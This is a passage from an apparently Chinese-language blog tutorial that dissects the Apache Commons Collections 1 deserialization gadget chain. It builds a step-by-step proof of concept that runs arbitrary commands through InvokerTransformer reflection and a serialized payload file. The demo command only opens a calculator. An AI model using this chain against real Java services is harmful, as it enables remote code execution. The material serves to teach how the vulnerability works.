class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里借用<a href="https://xz.aliyun.com/u/20851" target="_blank" rel="noopener">lalajun</a>总结的3要素：</p>
<blockquote>
<ol>
<li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；把它称为：payload</li>
<li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li>
<li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…）</li>
</ol>
</blockquote>
<p>把断点下在setValue点处，查看调用栈：</p>
<p>先进入1次ConstantTransformer.class:</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911105729719.png" alt="image-20200911105729719"></p>
<p>3次InvokerTransformer.class：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911105741271.png" alt="image-20200911105741271"></p>
<p>有两种，这里是由于<code>org.apache.commons.collections.functors.ChainedTransformer#transform</code>这个函数内部的循环有很多细节：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">            <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h2><p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);<span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p>
<p>TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);<span class="comment">//进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p>
<p>由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">          <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">          <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来仔细看这个循环，首先用IDEA查看我们传进来的这个参数iTransformers这个数组：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911111831007.png" alt="image-20200911111831007"></p>
<p><code>org.apache.commons.collections.functors.ConstantTransformer#transform</code></p>
<p>首先第一次进入transform函数，它返回的是<code>class java.lang.Runtime</code>这个类对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911113736984.png" alt="image-20200911113736984"></p>
<p>从第二次循环开始，就会进入<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>了，可以看到这次进入<code>transform</code>函数的参数object就变成了上一次返回的<code>class java.lang.Runtime</code>。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911140710656.png" alt="image-20200911140710656"></p>
<p>仔细看这次的<code>transform</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取input对象的class</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">//根据iMethodName、iParamTypes选择cls中的一个方法</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//根据iArgs参数调用这个方法</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>重点来了！！！</strong></p>
<p>可以看到代码中直接就调用了invoke方法，调用一系列参数，这就是触发点，接下来仔细看。</p>
<p>明显的反射机制，可见<strong>InvokerTransformer</strong>就是我们的触发任意代码执行处，看看源码中的文件描述：<br>先看看我们需要关注的<code>InvokerTransformer</code>类的描述：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> 通过反射机制创建一个新的对象实例的转换器实现</span></span><br></pre></td></tr></table></figure>

<p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map.Entry 类型setValue(<span class="string">"foobar"</span>)</span><br><span class="line">=&gt; AbstracInputCheckedMapDecorator.setValue()</span><br><span class="line">=&gt; TransformedMap.checkSetValue()</span><br><span class="line">=&gt; ChainedTransformer.transform(Object object)</span><br><span class="line">    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)</span><br><span class="line">    再进入 =&gt; InvokerTransformer.transform(Object input)</span><br></pre></td></tr></table></figure>

<h1 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h1><p>目标：</p>
<p>首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p>
<ul>
<li>Runtime.getRuntime：获取一个Runtime的实例</li>
<li>exec()：调用实例的exec函数</li>
</ul>
<p>因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">.<span class="title">invoke</span>(</span></span><br><span class="line">Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例</span><br><span class="line">,</span><br><span class="line"><span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="第一步：InvokerTransformer"><a href="#第一步：InvokerTransformer" class="headerlink" title="第一步：InvokerTransformer"></a>第一步：InvokerTransformer</h2><p>再回看反射机制触发函数<code>InvokerTransformer</code>类的<code>transform(Object input)</code>（做了简化处理，只留取重点部分）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">"exec"</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">this</span>.<span class="title">iArgs</span></span>=<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br></pre></td></tr></table></figure>

<p>那么在<code>InvokerTransformer</code>类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下测试代码直接调用InvokerTransformer通过反射执行任意命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">            new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//构造input</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    a.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接成功:)</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911155908541.png" alt="image-20200911155908541"></p>
<h2 id="第二步-ChainedTransformer"><a href="#第二步-ChainedTransformer" class="headerlink" title="第二步 ChainedTransformer"></a>第二步 ChainedTransformer</h2><p>弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：</p>
<ul>
<li>为了方便，攻击者受害者写在同一函数中</li>
<li>使用文件写入，代替网络传输</li>
</ul>
<blockquote>
<p>由于InvokerTransformer继承了Serializable类，是可以成功序列化的</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//模拟攻击</span></span><br><span class="line">    <span class="comment">//1.客户端构造序列化payload，使用写入文件模拟发包攻击</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">            new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line"></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(a);</span><br><span class="line">    <span class="comment">//2.服务端从文件中读取payload模拟接受包，然后触发漏洞</span></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//神奇第一处：服务端需要自主构造恶意input</span></span><br><span class="line">        Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        InvokerTransformer a_in = (InvokerTransformer) fin.readObject();</span><br><span class="line">        a_in.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：</p>
<ol>
<li>帮我们写一个payload作为input；</li>
<li>接受客户端输入参数，反序列化成InvokerTransformer类</li>
<li>再刻意调用InvokerTransformer类的transform函数</li>
</ol>
<p>实际上…..只有开发人员是自己人的情况下才满足条件吧……</p>
<p>所以我们面临一些问题：</p>
<ol>
<li>payload肯定需要在客户端可以自定义构造，再传输进入服务端</li>
<li>服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类</li>
<li>并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）</li>
<li>如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</li>
</ol>
<blockquote>
<p>这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。<br>但是对于服务端版本环境是有要求的，之后会说到</p>
</blockquote>
<p>那么我们一个个来解决问题：首先使客户端自定义paylaod！</p>
<p>下面我们需要关注<strong>ChainedTransformer</strong>这个类,首先看一下这个类的描述：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;</span></span><br><span class="line"><span class="comment">    * The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment">    * is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    将指定的转换器连接在一起的转化器实现。</span></span><br><span class="line"><span class="comment">    输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推</span></span><br></pre></td></tr></table></figure>

<p>可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是<strong>ChainedTransformer</strong>类的<code>transform</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">        * </span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">          <span class="comment">//熟悉，这就是刚才上面提到的循环</span></span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p>
<p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment">     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();<span class="comment">//这个super不清楚做了啥，</span></span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么我们知道可以自定义iTransformers的内容，我们已有条件如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最终执行目标</span></span><br><span class="line">    Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">    .getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    .<span class="title">invoke</span>(</span></span><br><span class="line">    Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例</span><br><span class="line">    ,</span><br><span class="line">    <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再看到InvokeTransformer代码我们需要<strong>引出一个注意点</strong>：</p>
<blockquote>
<p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p>
<ul>
<li>当input是一个类的实例对象时，获取到的是这个类</li>
<li>当input是一个类时，获取到的是java.lang.Class</li>
</ul>
<p>可以使用如下代码验证，这里不再赘述</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object a = Runtime.getRuntime();</span><br><span class="line">    Class b = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    System.out.println(a.getClass());</span><br><span class="line">    System.out.println(b.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//结果</span></span><br><span class="line">    <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">    <span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure>

<p>基于之前写的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//只调用InvokeTransformer的情况如下：</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line"></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure>

<p>我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。</p>
<p>先把a封装成ChainedTransformer格式，但是payload还是在外面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端触发所需内容</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    transformerChain.transform(input);<span class="comment">//此处必须为input，作为第一个输入</span></span><br></pre></td></tr></table></figure>

<p>把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。</p>
<h2 id="第三步-ConstantTransformer-gt-Runtime实例序列化"><a href="#第三步-ConstantTransformer-gt-Runtime实例序列化" class="headerlink" title="第三步 ConstantTransformer -&gt; Runtime实例序列化"></a>第三步 ConstantTransformer -&gt; Runtime实例序列化</h2><p>我们找到<code>ConstantTransformer</code>类跟<code>InvokkerTransformer</code>一样继承<code>Transforme</code>父类，可以进入数组<br>顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。<br>把Runtime实例写入这个变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">        <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量</span></span><br></pre></td></tr></table></figure>

<p>以上代码可以成功弹框执行！这里其实就是把之前的input放进chain里面去了。</p>
<p>那么我们模拟一下序列化与反序列化过程！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">    Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">    transformerChain_now.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>



<p>但是因为Runtime类的定义没有继承<code>Serializable</code>类，所以是不支持反序列化的。</p>
<h2 id="第四步-服务端构造Runtime示例"><a href="#第四步-服务端构造Runtime示例" class="headerlink" title="第四步 服务端构造Runtime示例"></a>第四步 服务端构造Runtime示例</h2><p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br>我们知道Runtime的实例是通过<code>Runtime.getRuntime()</code>来获取的，而<code>InvokerTransformer</code>里面的反射机制可以执行任意函数。<br>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p>
<p>我们先看getRuntime方法的参数：</p>
